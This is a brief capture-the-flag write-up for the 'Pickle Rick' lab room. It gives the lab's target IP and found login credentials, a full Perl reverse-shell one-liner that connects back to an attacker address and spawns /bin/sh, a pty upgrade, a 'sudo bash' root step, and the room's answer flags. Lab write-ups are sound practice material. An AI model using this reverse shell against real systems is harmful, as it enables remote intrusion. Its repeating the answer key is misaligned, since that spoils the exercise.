# Pickle Rick-Remote code execution

```
export IP=10.10.177.58
````

```
username=R1ckRul3s
password=Wubbalubbadubdub
```
# Material needed

1. Interesting directory: /login.php, /robots.txt 

2. Reverse shell 

```
perl -e 'use Socket;$i="10.8.193.113";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

3. Spawn terminal: python3 -c 'import pty; pty.spawn("/bin/bash")' 

4. Get the root bash: sudo bash

# Tasks

1. What is the first ingredient Rick needs? mr. meeseek hair

2. Whats the second ingredient Rick needs? 1 jerry tear

3. Whats the final ingredient Rick needs? fleeb juice